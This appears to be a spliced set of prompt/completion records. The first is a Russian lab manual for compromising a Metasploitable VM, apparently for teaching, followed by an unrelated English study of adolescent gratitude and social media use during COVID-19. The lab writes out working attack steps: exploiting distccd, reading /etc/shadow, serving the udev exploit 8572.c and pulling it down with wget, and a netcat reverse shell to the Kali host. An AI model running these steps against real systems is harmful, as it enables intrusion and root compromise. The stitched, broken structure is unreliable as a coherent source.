Ознакомиться с информационным ресурсом https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/ В случае ошибок при выполнении Л/р в первую очередь обратитесь к содержимому данного ресурса. 17. С браузера на основной машине запустите ip-адрес Metasploitable (например, information disclosure http://192.168.56.103/phpinfo) и изучить содержимое. 18. Создадим флаг на Metasploitable для того, чтобы затем «украсть» его из системы touch flag 19. Запишем туда secret* (взамен «secret» может быть сохранена конфиденциальная информация, персональные данные, ключи шифрования, логины и иные данные) echo ‘secret’ > flag * Вместо «secret» вам необходимо указать следующую информацию: Заглавные буквы ФИО исполнителя(ей) Л/р, дата выполнения Л/р, номер компьютера, за которым была выполнена Л/р (если Л/р выполнена на личном ПК, указать значение «0») Проведите проверку полученных результатов (в нашем случае в флаг был занесён «secret». 20. Ознакомьтесь с уязвимостью на сайте Mitre. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687 Обратите внимание на раздел «Description». Переведите смысл содержащейся в разделе информации. 21. Найти эксплойт 22. Выбрать эксплойт и ввести адрес уязвимой машины Фактически данным и последующими шагами мы определяем откуда, что и куда отправить (загрузить уязвимость на атакуемую машину) 23. Выбрать payload 24. Указать адрес Kali linux 25. Запустить инфо Обратите внимание на то, что мы и есть «демон». С этого момента для системы мы выступаем от имени системной службы, работающей в фоновом режиме. 26. Запускаем exploit и проверяем, кто мы на уязвимой системе 27. Проверьте имеем ли мы root доступ попробовав получить доступ к файлу /etc/shadow, который доступен для чтения только пользователю root и предназначен для хранения зашифрованных паролей. 28. Просмотрите какие в системе есть шеллы. cat /etc/shells Файл shells содержит список регистрируемых оболочек в системе. Приложения используют этот файл для определения правильных оболочек. Для каждой оболочки должна быть одна строка, содержащая полный путь к оболочке относительно корня. Оболочка ОС – это интерпретатор команд ОС, обеспечивающий интерфейс для взаимодействия пользователя с функциями системы. Командный интерпретатор исполняет команды своего языка, заданные в командной строке или поступающие из стандартного ввода или указанного файла. В UNIX системах распространены языки командных интерпретаторов bash, sh и ksh, а также альтернативные оболочки zsh, csh и tcsh. 29. Посмотрите доступные компиляторы для определения на каком языке необходимо запускать эксплойт. which gcc ls -l /usr/bin/ | grep -E -i -w 'gcc|clang' 30. Посмотрите утилиты, которые можно будет использовать для закачки эксплойта на атакуемую машину which wget /usr/bin/wget 31. Рассмотрим все процессы, запущенные в системе: ps aux Ключ «а» используется для отображения всех процессов, «х» — для отображения процессов, отсоединенных от терминала, а ключ «u» обеспечивает фильтрование по имени или идентификатору пользователя, который запустил программу. По этому списку можно смотреть доступные эксплойты для этих сервисов, но мы заранее знаем, что это udev IV. Базовая реализация атаки на виртуальную машину Metasploitable 32. В новом терминале Kali Linux выполните поиск эксплойта для udev. (udev – это менеджер устройств для новых версий ядра Linux, являющийся преемником devfs, hotplug и HAL. Его основная задача — обслуживание файлов устройств в каталоге /dev и обработка всех действий, выполняемых в пространстве пользователя при добавлении/отключении внешних устройств, включая загрузку firmware.) Вернитесь обратно в Metasploit framework нажав Ctrl+c и подтвердив «y» Найдите эксплойт командой: searchsploit udev Нам интересен local privilege Escalation(2) — /exploits/linux/local/8572.c Обратите внимание на запись пути к эксплойту. В дальнейшем мы будем использовать этот путь для написания команды отправки эксплойта не веб-сервер. 33. Загрузите информацию о эксплойте и изучите как его использовать: … 34. В новом окне терминала запускаем apache2 для того, чтобы загрузить на его веб-сервер эксплойт (а затем скачать на атакуемую виртуальную машину) 35. Скопируем эксплойт в публичную директорию Apache sudo cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html/kali.c Особое внимание уделите правильной расстановке пробелов в команде по примеру, приведенному ниже! 36. Скопируем эксплойт на уязвимую виртуальную машину (обратите внимание – для выполнения команды необходимо перейти в окно, где Вы выполняли команду пункта 14 с подключением к Metasploitable по ssh и указать в команде ip-адрес Вашей Kali Linux) wget 192.168.56.102/kali.c 37. Эксплойт скопировался в /tmp уязвимой машины Создадим файл необходимый для эксплойта touch run Выполните bash скрипт для reverse shell. Шелл-код (shellcode - код запуска оболочки) — это двоичный исполняемый код, который обычно передаёт управление командному процессору, например '/bin/sh' в Unix shell, 'command.com' в MS-DOS и 'cmd.exe' в ОС Microsoft Windows. Шелл-код может быть использован как полезная нагрузка эксплойта, обеспечивающая взломщику доступ к командной оболочке (англ. shell) в компьютерной системе. При эксплуатации удаленной уязвимости шелл-код может открывать заранее заданный порт TCP уязвимого компьютера, через который будет осуществляться дальнейший доступ к командной оболочке, такой код называется привязывающим к порту (port binding shellcode). Если шелл-код осуществляет подключение к порту компьютера атакующего, что производится с целью обхода брандмауэра или NAT, то такой код называется обратной оболочкой (reverse shell shellcode). echo '#!/bin/sh' > run echo '/bin/netcat -e /bin/bash 192.168.56.102 5555' >> run cp run /tmp 38. Скомпилируем наш эксплойт gcc kali.c -o kali 39. Начинаем слушать порт 5555 nc –lnvp 5555 40. Получаем PID (идентификатор процесса (process identifier)) udev netlink сокета cat /proc/net/netlink (при прослушивании порта PID равен 2410 (метаэсплойдебл на кали) 41. Запустим наш скомпилированный эксплойт chmod 755 kali ./kali 2410 42. Получим данные из ранее созданного флага (делается в реверс шел там где 555) cd /home/msfadmin ls –l cat flag В результате нам удалось получили ранее введенный secret (или любую сохраненную в флаге конфиденциальную информацию) Итоговые вопросы (краткий ответ): Вывод должен содержать информацию о: • понятой Вами цели лабораторной работы, • оценке достигнутого результата по итогам выполнения Л/р • знаниях, полученных в результате выполнения Л/р • умениях, полученных в результате выполнения Л/р • практических навыках, полученных в результате выполнения Л/р","completion":"Вывод: Лабораторная работа была направлена на ознакомление с инструментами кибербезопасности в среде Kali Linux, понимание процесса работы злоумышленника (команды Red Team) и осуществление мер защиты (действия Blue Team).

During the COVID-19 pandemic, some ways of using social media—such as directly communicating with friends— may have helped adolescents thrive. We examined longitudinal associations between high school adolescents’ social media use and gratitude across a 15-month period before and during the pandemic (n = 704, Mage = 15.10; 52% girls). The trajectories of gratitude and the importance of social media for meaningful conversations with friends—but not frequency of social media use—were positively associated over time. At the within-person level, gratitude predicted increased importance of social media for meaningful conversations, but not vice-versa. Findings suggest that gratitude may be associated with and may motivate using social media to foster social connection, but may not increase overall social media use. Key words: adolescence – gratitude – social media The COVID-19 pandemic has had an enormous impact on individuals’ social and psychological lives. For adolescents, the reduced in-person interaction with peers necessitated by the pandemic may pose unique challenges (Orben, Tomova, & Blakemore, 2020). To overcome the social distancing guidelines that restrict in-person interactions, many adolescents have been using social media to connect with peers during COVID-19 (Common Sense Media, 2020; Hamilton et al., in press). Despite prevailing discussions about the risks of adolescent social media use, positive engagement with peers on social media offers benefits, including opportunities to reap social support and engage in self-disclosure (Uhls, Ellison, & Subrahmanyam, 2017). Directly communicating with close friends on social media when in-person interactions are prohibited may be key to helping adolescents thrive during the isolation of COVID19 (Hamilton et al., in press; Orben et al., 2020). Gratitude, defined broadly as a general orientation toward “seeing the positive,” particularly in the context of social relationships (Wood, Froh, & Geraghty, 2010), may also help adolescents cope with the social deprivation of the pandemic. Notably, research has shown that gratitude both promotes positive social relationships and, simultaneously, is often enhanced in the context of close relationships (see Wood et al., 2010). With limited opportunities for in-person interaction, adolescents with higher trait gratitude may be more inclined to seek alternative, online routes to meaningful social interaction. Additionally, adolescents who have maintained social connection with friends on social media during the pandemic may have more opportunities to experience kindness and supportive relationships, which may in turn induce feelings of gratitude. In this study, we examine bidirectional associations between adolescents’ gratitude and motivation to use social media for meaningful communication with friends across a 15-month period leading up to and during the COVID-19 pandemic. Adolescent Peer Interactions and the COVID-19 Pandemic One of the most notable characteristics of adolescent development is the increased salience and importance of peers. Relative to children, adolescents spend more time with peers and peer relationships become more intimate and complex (Brown & Larson, 2009). Nearly all adolescents have at least one friend (Anderson & Jiang, 2018), and friendships provide adolescents with support and mutual responsiveness, as well as opportunities to build social skills like conflict management and perspective-taking (Bagwell & Bukowski, 2018). Although some challenges of the pandemic have affected only a subset of adolescents—including financial disruptions and death of loved ones— nearly all adolescents have had to contend with restrictions on peer interactions, increasing the risk for mental health problems (Loades et al., 2020; Racine et al., 2020). In numerous studies from the early months of the pandemic, adolescents reported that one of their greatest concerns about COVID-19 social distancing was about maintaining friendships remotely (e.g., Efuribe, Barre-Hemingway, Vaghefi, & Suleiman, 2020; Ellis, Dumas, & Forbes, 2020). Although evidence is still emerging, some findings suggest that the ability to stay connected to friends is protective against mental health challenges related to social distancing during the pandemic (Magson et al., 2021). Adolescents who have been able to safely continue meaningfully connecting with friends during the pandemic may have better mental health and more opportunities to experience positive emotions. Adolescent Social Media Use Social media refers to websites and applications that allow for social interaction (Hamilton et al., in press; Nesi, Choukas-Bradley, & Prinstein, 2018). To contend with limitations on in-person interactions, many adolescents have turned to social media, even more so than usual, for peer connection during the pandemic (Common Sense Media, 2020; Ellis et al., 2020; Munasinghe et al., 2020). Some parents have reported that their children’s social media use has become “excessive” (Caffo, Scandroglio, & Asta, 2020), and many have sought strategies to reduce their children’s media use given concerns about its potential negative effects (Vanderloo et al., 2020). Indeed, there is a small positive association between frequency of social media use and adolescent internalizing symptoms that has received ample research attention in recent years (Keles, McCrae, & Grealish, 2020; Sarmiento et al., 2020). However, it is necessary to disentangle frequency of use (i.e., “screen time”) from quality of use (see Granic, Morita, & Scholten, 2020; Marino, 2018; Odgers & Jensen, 2020), particularly in an era when most or all peer interactions occur on these platforms. Prior to the pandemic, adolescents reported that a primary motivation to use social media was to interact with peers and 81% said that social media helped them feel more connected to friends (Anderson & Jiang, 2018). Although theories on the affordances of social media highlight the differences between in-person and technology-mediated communication (e.g., boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011), the features of social media do not preclude positive social experiences. For example, to varying degrees, interactions on social media can be asynchronous and provide limited interpersonal social cues (Nesi et al., 2018). However, the asynchronicity and constant availability of social media allows for adolescents to communicate with their friends more frequently than in-person interactions would allow. Increasingly, social media platforms also offer a range of features, such that adolescents may have opportunities to post publicly, chat privately, or video chat with their friends, all on the same platform. Relative to the large body of work on the risks of social media use, research examining the potential positive impacts of social media use on adolescents is extremely sparse. Preliminary evidence suggests that benefits are accrued in large part through positive social connection, feelings of social belonging, and direct communication with friends (Allen, Ryan, Gray, McInerney, & Waters, 2014; Uhls et al., 2017). Specifically, when social media is used to foster close relationships, some evidence suggests that adolescents can feel positive emotions, such as higher self-esteem, well-being, and relational satisfaction (Best, Manktelow, & Taylor, 2014; Hall & Baym, 2011; Uhls et al., 2017). Given the strong associations between various positive emotions and the uniquely social component of gratitude (Wood et al., 2010), gratitude may also theoretically result from online social connection. Gratitude may also prompt adolescents to engage in positive interactions on social media, yet no prior work has examined positive emotional antecedents of different types of social media use. The Role of Gratitude In the limited prior work on adolescents’ positive use of social media, no studies have examined the role of gratitude. Although higher gratitude may both encourage and stem from meaningful peer interaction on social media, gratitude may be of particular relevance during the COVID-19 pandemic. Being thankful for close relationships and one’s life circumstances is an adaptive, natural coping response when those people and circumstances are threatened during a crisis (Fredrickson, Tugade, Waugh, & Larkin, 2003). Indeed, a sentiment analysis of public Twitter posts found that expressions of gratitude increased during the early months of the pandemic (Lwin et al., 2020). Gratitude can be defined as both an emotion and a trait. In terms of emotionality, grateful affect (e.g., feeling thankfulness after receiving aid from others) can vary in frequency and intensity across people and time (Wood et al., 2010). Gratitude as a trait is broadly conceptualized as an “orientation toward noticing and appreciating the positive in the world” (Wood et al., 2010; pg. 891), and higher trait gratitude is characterized by consistently higher levels of grateful affect (McCullough, Emmons, & Tsang, 2002). Research in the field of positive psychology indicates that positive emotions such as gratitude—not just the absence of negative emotions—are central to health, wellness, resilience, and human flourishing (see Seligman & Csikszentmihalyi, 2000). Robust evidence with adults and adolescents indicates that gratitude is associated with lower risk of psychopathology and higher well-being (Bono et al., 2019; Froh, Bono, & Emmons, 2010; Kwok, Gu, & Cheung, 2019; Wood et al., 2010; Yang, Yan, Jia, Wang, & Kong, 2020). Gratitude is also a uniquely social emotion, given that gratitude is often felt toward others and in the context of interpersonal relationships. Theoretical work highlights that gratitude plays a central evolutionary role in promoting social wellbeing and mutual responsivity in close relationships (Algoe, 2012), suggesting that gratitude may impact well-being indirectly through positive social experiences. Empirical findings also suggest a bidirectional association between gratitude and positive social connection. For example, among adults, gratitude for a romantic partner both originates from and promotes relationship maintenance behaviors (Kubacka, Finkenauer, Rusbult, & Keijsers, 2011). Among adolescents, longitudinal findings show that gratitude and positive social outcomes, including social integration and prosocial behavior, are mutually reinforcing (Bono et al., 2019; Froh et al., 2010). Although research has not examined mutually reinforcing associations between gratitude and online social connection, these prior findings likely apply to social media contexts. Gratitude is likely not sufficient to fully shield individuals from the challenges and tragedies of the COVID-19 pandemic, yet gratitude and meaningful online communication may have benefits for some adolescents. The Present Study The current study examines associations between changes in gratitude and motivations to use social media before and during the COVID-19 pandemic among U.S. high school adolescents. Although prior work has focused almost exclusively on the risks of social media use, in this study we sought to identify associations between social media use and gratitude—a positive emotional experience— particularly in a context when in-person social interaction is not possible. During the pandemic, gratitude may motivate social interaction (Jiang, 2020; Syropoulos & Markowitz, 2021), even when only online social contact is permitted. Additionally, social interaction—particularly when social deprivation is high—may spur feelings of gratitude. We sought to understand how adolescents’ motivation to use social media for direct, meaningful conversations could be related to gratitude, above and beyond the effects of frequency of social media use. We predicted that gratitude and the importance of social media for meaningful conversations with friends would be bidirectionally associated over time. METHOD Participants were 743 adolescents between the ages of 13 and 18 at baseline (Mage = 15.10, SDage = 1.01) recruited from a large, diverse suburban high school district in the U.S. state of Florida as part of a longitudinal study assessing adolescents’ character development and social media use. The vast majority (n = 724) attended a single school, ten participants attended a second school, and the remaining participants (n = 9) attended four other schools. Adolescents self-reported their gender identity at each time point. The sample included 52.2% girls and 44.5% boys; 3.1% reported another gender identity or reported different gender identities at different time points. One participant had missing data for gender identity. Data were collected and de-identified by the Character Lab Research Network (CLRN) before being shared with the research team. The CLRN is a consortium of schools and researchers working together to collect school-based data and facilitate developmental research. Students completed online surveys during regular school hours. All study procedures were approved by the university’s Institutional Review Board. Sample demographic information regarding race and socioeconomic status (SES) was obtained from school student information systems data. The sample was 53.97% Hispanic/Latinx, 26.11% White non-Hispanic/Latinx, 7.40% Black, 6.46% Asian, and 6.06% multiracial or another race/ethnicity. Nearly half of participants (43.61%) indicated that they were eligible for free or reduced-price lunch, which was used in this study as a proxy for lower SES. Participants completed an online survey at four time points: two before the pandemic (October 2019 [T1] and February 2020 [T2]), and two during the pandemic (October 2020 [T3] and January 2021 [T4]). During COVID-19, all participants at one school (n = 10) attended school fully virtually. The remaining schools were operating under a hybrid learning environment, such that some students were fully in-person and others were fully virtual. A minority of these students were engaging in inperson learning at T3 (15.21%) and T4 (27.46%); the remaining students were learning virtually. Independent samples t tests compared those who were learning virtually to those who were learning inperson at both time points during COVID-19. There were no significant differences in frequency of social media use at T3 (t = .35, p = .72) or T4 (t = .13, p = .89), no significant differences in gratitude at T3 (t = .13, p = .90) or T4 (t = .87, p = .39), and no significant differences in the importance of social media for meaningful conversations with friends at T3 (t = .60, p = .55) or T4 (t = .97, p = .33). Measures Frequency of social media use. A single item was developed for the current study to assess time spent using social media. At each time point, the survey packet indicated to participants that “Social media refers to any apps or websites that involve social interaction, such as Instagram, Snapchat, or Facebook.” Participants reported, on average, how many hours they spent on social media per day. Response options ranged from 0 = less than one hour to 10 = 10 hours or more. Similar single-item measures of frequency of social media use are commonly used among adolescent samples (e.g., Ellis et al., 2020). Importance of social media for meaningful conversations. Using a survey instrument developed by Common Sense Media (2020), participants responded to the item, “How important is social media to you for having meaningful conversations with your close friends?” Responses ranged from 1 = Not important at all to 5 = Extremely important. Gratitude. To assess adolescents’ trait gratitude, participants completed the Gratitude Questionnaire-Six Item Form at each time point (GQ-6; McCullough et al., 2002). The scale assesses the level of gratitude participants experience in their daily lives. Example items include “I have so much in life to be thankful for,” “I am grateful to a wide variety of people,” and “As I get older, I find myself more able to appreciate the people, events, and situations that have been a part of my life history.” Response options range from 1 = Strongly disagree to 7 = Strongly agree. A mean score is calculated across items, with higher scores indicating greater gratitude. The GQ-6 can be reliably used with adolescent samples (Froh et al., 2011) and showed good reliability in the current study (T1 a = .80, T2 a = .79, T3 a = .77, T4 a = .79). Analysis Plan Descriptive statistics, including means, standard deviations, and bivariate correlations among all study variables, were first examined using R version 3.6.1. The remainder of analyses were conducted within a structural equation modeling framework in MPlus 8.5 (Muthen & Muthen, 1998– 2017). Any participants who had data for any study variables of interest (i.e., gratitude, importance of social media for meaningful conversations, and frequency of social media use) at Time 3 or Time 4 (i.e., during the COVID-19 pandemic) were included in analyses. Full information maximum likelihood with robust standard errors (MLR) was used for estimation and to handle missing data. When comparing fit between two nested models, chi-square difference tests using an MLR correction (Sartorra & Bentler, 2010) were used to determine relative model fit. For the latent growth curve model, covariates included gender (i.e., boy, other gender; girl as reference group), race/ethnicity (i.e., White, Black, Asian, other race/ethnicity; Hispanic/Latinx as reference group), SES (i.e., dummy code for free/reduced-price lunch), and school (i.e., a dummy code for the largest school). First, a multivariate latent growth curve model with four time points was constructed to examine trajectories and relations among variables of interest. Time was coded in models so as to account for unequal intervals between time points (i.e., factor loadings set to 1.2, .8, 0, and .3). The intercept for all variables was set to Time 3, the first time point during the COVID-19 pandemic. Unconditional univariate latent growth models were first conducted to determine the optimal functional form of each variable and to examine the time-specific residual structure. A multivariate model was then constructed, controlling for demographic covariates, with each of the three primary variables examined in parallel, modeling covariances among latent growth factors. Next, a random-intercept cross-lagged panel model was constructed to examine the direction of effects in within-person associations between variables. The model simultaneously included all three variables with autoregressive and crosslagged paths estimated between time points and within-time covariances among the variables. Separate models were tested with constraints setting equal the cross-lagged paths, the autoregressive paths, and their combination. These models were compared to a baseline model with no constraints. We retained the most parsimonious model that did not worsen fit compared to the baseline model. RESULTS Descriptive statistics for all study variables and bivariate correlations are presented in Table 1. Univariate Latent Growth Models Unconditional univariate latent growth models were first constructed for each variable. Interceptonly models were first conducted for each, followed by models with both latent intercept and slope factors, and finally, latent intercept, slope, and quadratic factors. Equality constraints on time-specific residuals were then compared against a heteroscedastic residual structure. For gratitude, a linear model with heteroscedastic residuals was the best-fitting and most parsimonious, with excellent fit, v2 (5) = 6.48, p = .262, RMSEA = .02, SRMR = .05, CFI = 1.00, TLI = .99. For frequency of social media use, a linear model with homoscedastic residuals was determined to be the optimal model form, with excellent fit, v2 (8) = 12.18, p = .143, RMSEA = .03, SRMR = .04, CFI = 0.99, TLI = .99. For importance of social media for meaningful conversations, a linear model with homoscedastic residuals was also best, with excellent fit, v2 (8) = 16.71, p = .033, RMSEA = .04, SRMR = .07, CFI = 0.97, TLI = .98. Results of these models suggested a significant negative slope (b = 0.15, SE = .03, p < .001) and positive intercept (b = 4.36, SE = .03, p < .001) for gratitude. Similarly, a significant negative slope (b = 0.10, SE = .04, p = .005) and positive intercept (b = 3.63, SE = .03, p < .001) were revealed for importance of social media for meaningful conversations. The slope of frequency of social media use was positive and significant (b = 0.40, SE = .60, p < .001), and the intercept was positive (b = 4.14, SE = .07, p < .001). Variances of slopes and intercepts were significant (p < .001) for all models with the exception of the slope variance for frequency of social media use (p = .48). Multivariate Model These best-fitting univariate models were then combined into a single, multivariate model with covariances between all latent growth factors and correlations between time-specific residuals (see Figure 1). Setting correlations between time-specific residuals to be equal across time did not result in a significant decrement in model fit; thus, these constraints were retained for parsimony. The final model included time-invariant covariates of gender, race/ethnicity, SES, and school. Model fit was excellent, v2 (102) = 118.73, p = .123, RMSEA = .02, SRMR = .03, CFI = 0.99, TLI = .98. In the final model, the slope of importance of social media for meaningful conversations was significantly associated with the slope of gratitude, controlling for overall trajectories of social media use. This indicates that youth who experience steeper decreases in the importance they attribute to social media for meaningful conversations also report steeper decreases in gratitude over time. Similarly, youth who experience steeper increases in the importance of social media for meaningful conversations also report steeper increases in gratitude. However, there was no association between the slope of frequency of social media use and slope of gratitude. See Table 2 for covariances among all latent growth factors in the final, conditional multivariate model. Within-Person Cross-Lagged Associations Finally, a random-intercept cross-lagged panel model was used to examine within-person change in gratitude, time on social media, and importance of social media for meaningful conversations with friends (see Figure 2). Nested model comparisons suggested that the cross-lagged paths could be constrained to be equal, but constraining autoregressive paths resulted in a significant decrement in model fit; thus, in the final model, cross-lagged paths were constrained, whereas autoregressive paths were allowed to freely vary. The model fit the data well, v2 (33) = 45.24, p = .076, RMSEA = .02, SRMR = .04, CFI = 0.99, TLI = .98. The stable between-person part of the model (i.e., the random intercept) showed a significant negative covariance between gratitude and time on social media (b = 0.24, SE = .08, p = .003), a significant positive covariance between time on social media and importance of social media for meaningful conversations with friends (b = 0.28, SE = .08, p < .001), and a nonsignificant association between gratitude and importance of social media for conversations with friends (b = 0.07, SE = .04, p = .078). The within-person part of the model indicated a significant cross-lagged path from gratitude to importance of social media for meaningful conversations with friends. Adolescents who reported higher levels of gratitude at a given time point (compared to their average) reported higher importance of social media for meaningful conversations with friends at subsequent time points (b = 0.11, SE = .05, p = .045). The opposite direction of effects was not supported: within-person change in importance of social media for conversations with friends was not significantly associated with within-person change in gratitude at a subsequent time point (b = 0.03, SE = .04, p = .432). Within-person change in frequency of social media use was not associated with subsequent change in gratitude (b = 0.01, SE = .03, p = .852) or importance of social media for meaningful conversations with friends (b = 0.02, SE = .03, p = .435). Within-person change in frequency of social media use was also not predicted by prior change in gratitude (b = 0.01, SE = .10, p = .884) or importance of social media for meaningful conversations with friends (b = 0.12, SE = .07, p = .092). See Table 3 for the within-person autoregressive and cross-lagged DISCUSSION The current study examined U.S. adolescents’ gratitude and social media experiences across a 15- month period leading up to and during the COVID-19 pandemic. Overall, results show that gratitude and the importance adolescents attribute to using social media for meaningful conversations with friends are associated over time. Across the four time points of the study, gratitude and importance of social media for meaningful conversations with friends went down on average, but were positively associated with each other over time. In other words, those who reported greater importance of social media for having meaningful conversations over time also reported higher levels of gratitude over time. Furthermore, at the withinperson level, higher-than-average gratitude was associated with subsequent increases in the importance of social media for meaningful conversations, but not vice-versa, suggesting that within-person increases in gratitude may spur motivation to use social media to connect with friends. Across models, frequency of social media use was generally not significantly associated with gratitude, or in some cases was negatively associated. Thus, gratitude may be associated with using social media to foster social connection, but not necessarily all social media use. Benefits of Social Media Use During the COVID19 Pandemic The COVID-19 pandemic has threatened the mental health of adolescents in numerous ways, including by limiting their in-person social interactions during a developmental period when peers are of the utmost importance. Online communication, primarily through social media, may be the only way adolescents can continue relationships with friends and stay connected to a broader peer network. Prior work has shown that adolescents’ frequent social media use is associated with worse mental health (Keles et al., 2020; Sarmiento et al., 2020). However, the effects of social media use on adolescent well-being likely depend on the type of social media use in question. For example, one recent study found that more frequent social media use during the pandemic was associated with negative outcomes for some adolescents, yet frequent direct online communication with friends was associated with lower levels of loneliness (Ellis et al., 2020). In line with this prior work, the present results highlight that intraindividual change in using social media to foster or maintain close relationships with friends may co-occur with changes in gratitude and may be more important to consider than overall frequency of social media use. Directional Associations Between Gratitude and Social Media Use To our knowledge, no prior work has examined how the importance adolescents attribute to social media for having meaningful communication with friends is associated with gratitude—or any positive emotion—over time. Yet prior work has found that gratitude is associated with better individual mental health both directly and indirectly through increased positive social experiences (Wood et al., 2010). The association between gratitude and interpersonal relationships is often mutually reinforcing in an “upward spiral,” with gratitude contributing to positive social experiences and these experiences in turn enhancing gratitude (e.g., Bono et al., 2019; Fredrickson, 2004; Froh et al., 2010). The inclination toward positive social engagement for those high in gratitude is likely not limited to in-person interactions. Social media offers a unique venue for engaging in social connection and building gratitude, particularly when other forms of interpersonal connection are limited—such as during a pandemic. In the current study, at the within-person level, increases in gratitude relative to one’s average were associated with subsequent increases in the importance of social media for meaningful conversations, yet increases in the importance of social media for meaningful conversations were not directly associated with later increases in gratitude. Thus, our findings highlight that gratitude may encourage social media use aimed at fostering close peer connections, without increasing overall social media use. As such, gratitude may be a key underexplored mechanism in enhancing positive social media use. Broadly speaking, these results highlight an important and often overlooked point for an understanding of adolescent social media use: while researchers usually focus on how social media use predicts subsequent adjustment, adolescents’ sense of well-being may also drive how they engage with social media. One recent study showed that life satisfaction predicted less frequent social media use among adolescents (Orben, Dienlin, & Przybylskia, 2019), but the effect of emotional states on specific social media behaviors remains underexplored. Additionally, although adolescents’ specific uses of social media have occasionally been examined as an outcome of psychopathology (Radovic, Gmelin, Stein, & Miller, 2017), we are unaware of prior studies investigating how adolescents’ positive socioemotional states or traits predict specific forms of social media use. Beyond the COVID-19 Pandemic: Implications for Future Research and Intervention Although the present results may be specific to the context of the COVID-19 pandemic, the results likely have broad implications. For adolescents experiencing isolation—whether physical or emotional—some forms of social media use may be related to positive emotional experiences, such as gratitude (Orben et al., 2020). Additionally, adolescents who experience positive emotions such as gratitude may benefit from social media as a context for positive interpersonal experiences (e.g., connection, support), given that it is available 24/7, unlike in-person social interactions (Nesi et al., 2018). For example, adolescents who are physically isolated from their communities, such as those living in rural settings, may benefit from using social media to foster and maintain meaningful connections with their close friends (Chew, LaRose, Steinfield, & Velasquez, 2011), which may contribute to an upward spiral of positive emotions and positive social interactions. Future research should explore other potential positive emotional experiences beyond gratitude that may be associated with certain positive forms of social media use. Researchers can use findings on adolescent social media use during the era of COVID-19 as a foundation from which to understand the potential for social media to foster connection, perhaps especially among isolated adolescents (for a theoretical commentary, see Hamilton et al., in press). More broadly, current and future research on adolescent social media use should examine how adolescents are using social media and what socioemotional experiences precede and arise from these experiences (see Granic et al., 2020; Keles et al., 2020; Marino, 2018; Odgers & Jensen, 2020). The vast majority of previous work focuses on frequency of social media use. Results from this prior work provide important insights into the effects of frequent social media use, yet collapse a variety of different social media behaviors into a single metric of use. In the current study, we found that overall social media use functioned very differently from adolescents’ reported importance of social media for meaningful conversations with close friends. Future research should attend to the diversity and nuances of adolescents’ potential positive and negative experiences online, made possible by the affordances of social media (boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011). Notably, very little prior work has specifically examined adolescents’ motivations for using social media for meaningful conversations with friends, perhaps due to an assumption that online interactions are more superficial or transient. However, to the extent that youth are engaging in the majority of their peer interactions via social media, it is critical to understand how online engagement is supporting key socio-developmental tasks such as the development of more intimate, complex peer relationships. Given that some recent work has found that online social support may not provide the same psychological benefits as face-to-face support among young adults (e.g., Shensa et al., 2020), future research should aim to understand how features of different social media tools (e.g., private text messaging, video chatting, public posting) afforded by online communication alter adolescents’ meaningful conversations with friends. Importantly, the current results highlight possible avenues of intervention to increase adolescents’ positive emotional experiences using social media. Until recently, most social media-related interventions have focused on limiting social media use directly or reducing the negative effects of social media (e.g., Galla, Choukas-Bradley, Fiore, & Esposito, 2021; Tamplin, McLean, & Paxton, 2018; Walther, Hanewinkel, & Morgenstern, 2014). Fewer interventions have sought to increase positive experiences on social media or foster the antecedents (e.g., gratitude) of positive social media use. In a recent school-based gratitude intervention, adolescents who used a novel social media app to express gratitude for their peers showed increases in trait gratitude, positive affect, life satisfaction, and friendship satisfaction and reductions in anxiety and negative affect (Bono, Mangan, Fauteux, & Sender, 2020). Interventions that aim to enhance the positive aspects of social media use—particularly using the tools and platforms adolescents are already accessing—could broadly benefit adolescent mental health and specifically target teens who are struggling with physical or social isolation. Likewise, interventions aimed at boosting gratitude may contribute to increasing positive social media use and upward spirals of well-being. Limitations and Future Directions The current study has several strengths, including the use of a large sample of adolescents followed across a 15-month period leading up to and during the COVID-19 pandemic. However, the results from this sample may not generalize to other samples or contexts. For example, the negative effects of the COVID-19 pandemic have not been universally experienced; adolescents of color and those living in low-income contexts have been disproportionately negatively affected (Webb Hooper, Napoles, & Perez-Stable, 2020). The current sample is relatively diverse in terms of racial/ethnic identity and SES, yet each was measured with a oneitem proxy reported by the school. Complex contextual factors affecting the adolescents in this sample remain unknown, limiting our ability to examine the role of these factors in the current models and to determine the generalizability of the present results. For adolescents struggling under the burden of poverty or discrimination, communication with friends online and experiences of gratitude may have benefits, but may not be sufficient to overcome systemic barriers to sustained wellbeing. Future research is critical to understand how these complex contextual and identity factors affect the online and socioemotional experiences of diverse adolescents. Additionally, although we found no differences across participants who were learning in-person vs. virtually during COVID-19, we do not have sufficient information to understand how the present results may be directly affected by isolation from schoolbased peers. For example, even adolescents who have been attending school in-person during the pandemic may struggle with isolation if their friends are engaging in remote learning, whereas those learning remotely who are able to safely see friends in-person may be protected from loneliness despite broader isolation from peers. Future work that replicates the present findings in various contexts, including during the pandemic and in other situations of isolation, will help elucidate the unique effect of peer isolation on the present findings. The present study also relies on correlational self-report data. Self-report measures are critical for understanding the subjective reactions adolescents have to online experiences. However, adolescents’ reports of their frequency of social media use could be supplemented with passively collected phonebased data in future work, which can measure frequency of use without recall bias. Ecological momentary assessment procedures may also help capture immediate affective responses to social media experiences, providing more information about the temporal unfolding of short- and longterm effects of experiences on social media (e.g., Hamilton, Do, Choukas-Bradley, Ladouceur, & Silk, 2021). Moreover, while the current study provides information about the unfolding of adolescents’ social media experiences and gratitude across four time points, causality cannot be determined without an experimental design. CONCLUSION The current study highlights associations between adolescents’ gratitude and motivation to use social media to build social connection in the context of COVID-19. This study also highlights the value of including measures of specific social media behaviors beyond simply frequency of social media use to understand social-emotional development and sheds light on how some forms of social media use may be linked to positive emotional experiences. Furthermore, our results suggest gratitude is a predictor of positive social media use not previously studied among adolescents. Using social media to foster social connection, but not all social media use, may be associated with higher gratitude over time, and furthermore, gratitude may motivate adolescents’ meaningful social media use. While our findings are preliminary, they suggest potential avenues for interventions that aim to enhance the positive aspects of social media use, which could be especially beneficial for teens struggling with physical or social isolation.","completion":"\\"In the current study, gratitude and the importance adolescents attribute to using social media for meaningful conversations with friends are associated over time.\\" \\"Adolescents who experience steeper decreases in the importance they attribute to social media for meaningful conversations also report steeper decreases in gratitude over time.\\" \\"Adolescents who reported higher levels of gratitude at a given time point reported higher importance of social media for meaningful conversations with friends at subsequent time points.\\" \\"Gratitude may be associated with using social media to foster social connection, but not necessarily all social media use.\\" 